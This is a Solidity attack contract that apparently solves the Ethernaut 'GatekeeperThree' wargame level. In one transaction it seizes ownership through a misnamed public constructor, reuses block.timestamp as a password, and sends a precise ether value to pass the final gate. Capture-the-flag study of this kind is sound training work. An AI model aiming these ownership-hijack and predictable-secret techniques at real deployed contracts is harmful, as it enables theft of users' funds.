// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;

    function getAllowance(uint256 _password) external;

    function createTrick() external;

    function enter() external;
}

contract GatekeeperThreeAttack {
    function attack(address payable _targetAddress) external payable {
        IGatekeeperThree target = IGatekeeperThree(_targetAddress);

        // Cope gateOne
        target.construct0r();

        // Cope gateTwo
        target.createTrick();
        target.getAllowance(block.timestamp);

        // Cope gateThree (msg.value should be equal to 1000000000000001)
        _targetAddress.call{value: msg.value}("");

        target.enter();
    }
}
